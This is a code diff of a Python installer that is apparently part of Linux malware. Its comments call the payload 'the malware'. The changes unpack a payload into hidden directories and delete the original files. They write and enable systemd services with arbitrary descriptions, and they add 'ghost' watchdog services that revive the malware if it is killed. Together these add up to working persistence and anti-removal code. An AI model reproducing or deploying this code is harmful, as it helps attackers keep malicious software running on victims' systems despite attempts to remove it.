@@ -5,8 +5,16 @@ import tarfile
 
 # true if root priviledges false otherwise
 isRoot = os.popen("echo $USER").read()=="root\n"
-userData = config.root if isRoot else config.user
+ghostDir = config.root["ghostDir"] if isRoot else config.user["ghostDir"] + "."
+ghostDir = os.path.expanduser(ghostDir)
+targetDir = config.root["targetDir"] if isRoot else config.user["targetDir"] + "."
+targetDir = os.path.expanduser(targetDir) + config.dirName + "/"
+serviceDir = config.root["serviceDir"] if isRoot else config.user["serviceDir"]
+serviceDir = os.path.expanduser(serviceDir)
 
+serviceTemplate = "[Unit]\nDescription={desc}\n[Service]\nType=simple\nExecStart=/usr/bin/python3 {path}"
+
+serviceList = [i[1] for i in config.ghosts] + [config.serviceName]
 
 #fuction to remove a directory
 def rem(target):
@@ -33,37 +41,56 @@ def compress(out):
 # force: overwrite if target folder exists
 # clear: remove old files
 def move(source, force=False, clear=True):
-	target = os.path.expanduser(userData["targetDir"])
-
-	if os.path.exists(target):
+	if os.path.exists(targetDir):
 		if force:
-			for i in os.listdir(target):
-				os.remove(target+i)
-			os.rmdir(target)
+			for i in os.listdir(targetDir):
+				os.remove(targetDir+i)
+			os.rmdir(targetDir)
 		else:
 			return
 
-	os.mkdir(target)
+	os.mkdir(targetDir)
 
 	with tarfile.open(source,"r") as file:
-		file.extractall(target)
+		file.extractall(targetDir)
 
 	if clear:
 		rem(os.path.abspath("."))
 
-# creates and enables a service to auto run the malware
+# creates and enables a service to auto run
 # runFile: file service will run
-def createService(runFile):
-	data = config.service.format(targetPath = os.path.abspath(runFile))
+# serviceName: name of service file
+# desc: description of the service
+def createService(runFile, serviceName, desc, start=False):
+	data = serviceTemplate.format(desc=desc, path=runFile)
 
-	target = os.path.expanduser(userData["serviceLoc"])
-	if not os.path.exists(target):
-		os.makedirs(target)
+	if not os.path.exists(serviceDir):
+		os.makedirs(serviceDir)
 
-	with open(target + config.serviceName, "w") as file:
+	with open(serviceDir + serviceName + ".service", "w") as file:
 		file.write(data)
 
 	if isRoot:
-		os.system("systemctl enable " + config.serviceName)
+		os.system("systemctl enable " + serviceName)
+		if start:
+			os.system("systemctl start " + serviceName)
 	else:
-		os.system("systemctl --user enable " + config.serviceName)
+		os.system("systemctl --user enable " + serviceName)
+		if start:
+			os.system("systemctl --user start " + serviceName)
+
+# creates a service and programm which will revive the malware if it has been killed
+# fileName: name for ghost software
+# serviceName: name of service
+# desc: description of service
+def createGhost(fileName, serviceName, desc):
+	with open("ghost.py") as file:
+		data = file.read()
+
+	data = data.format(services=serviceList, sleepTime=10, service="{service}")
+
+	with open(ghostDir+fileName, "w") as file:
+		file.write(data)
+
+	createService(ghostDir+fileName, serviceName, desc, True)
+
